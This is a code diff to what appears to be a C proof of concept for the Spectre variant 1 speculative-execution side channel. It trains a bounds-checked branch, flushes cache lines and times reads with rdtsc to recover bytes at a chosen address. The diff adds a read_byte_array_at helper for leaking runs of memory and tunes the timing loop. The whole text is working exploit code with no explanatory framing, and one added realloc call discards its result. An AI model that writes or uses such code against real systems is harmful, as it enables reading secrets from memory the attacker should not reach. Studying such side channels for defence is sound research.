@@ -18,16 +18,16 @@
 
 #define MIN_ITERATIONS 1
 #define MAX_ITERATIONS 500
-#define BRANCH_TRAINS 16
+#define BRANCH_TRAINS 32
 #define PAGE_SIZE 4096
 #define CUTOFF_TIME 500
 #define CACHE_HIT_COEFF 3
 
 FILE *output = NULL;
 
-unsigned char side_effects[256 * PAGE_SIZE] = {0xda}; // Not zero because 0-page
+uint8_t side_effects[256 * PAGE_SIZE] = {0xda}; // Not zero because 0-page
 size_t array_size = BRANCH_TRAINS;
-char base_array[BRANCH_TRAINS];
+uint8_t base_array[BRANCH_TRAINS];
 
 uint8_t victim_function(uint64_t i) {
   if (i < array_size)
@@ -44,21 +44,23 @@ uint8_t read_at(uint64_t addr) {
       victim_function(i);
       _mm_clflush(&array_size);
     }
+    _mm_clflush(&array_size);
     victim_function(addr);
 
     for (size_t i = 1; i < 256; i++) {
       register uint64_t time;
-      do {
-        __sync_synchronize(); // Following code has to be executed in correct order, so we synchronize the pipeline
-        register uint64_t start = __rdtsc();
-        time = side_effects[i * PAGE_SIZE];
-        __sync_synchronize();
-        time = __rdtsc() - start;
-        _mm_clflush(&side_effects[i * PAGE_SIZE]);
-      } while (time > CUTOFF_TIME);
+   
+      __sync_synchronize(); // Following code has to be executed in correct order, so we synchronize the pipeline
+      register uint64_t start = __rdtsc();
+      time = side_effects[i * PAGE_SIZE];
+      __sync_synchronize();
+      time = __rdtsc() - start;
+      _mm_clflush(&side_effects[i * PAGE_SIZE]);
       // If the read is abnormally slow we have to start over - got interrupted by the OS.
-
-      if (t_iter > MIN_ITERATIONS) {
+      if (time > CUTOFF_TIME) {
+       continue;
+      }
+      if (t_iter > MIN_ITERATIONS && c_i_cnt[i]) {
         register uint64_t average = (c_sum - c_i_sum[i]) / (c_cnt - c_i_cnt[i]);
         if (CACHE_HIT_COEFF * time < average) {// faster than else's average - that's a cache hit.
           if (output != NULL) {
@@ -96,6 +98,15 @@ uint8_t *read_byte_string_at(uint64_t addr) {
       a = realloc(a, capacity);
     }
   } while (a[read - 1]);
+  realloc(a, read);
+  return a;
+}
+
+uint8_t *read_byte_array_at(uint64_t addr, size_t num) {
+  uint8_t *a = malloc(num);
+  for(size_t offset = 0; offset < num; offset++) {
+    a[offset] = read_at(addr + offset);
+  }
   return a;
 }
 
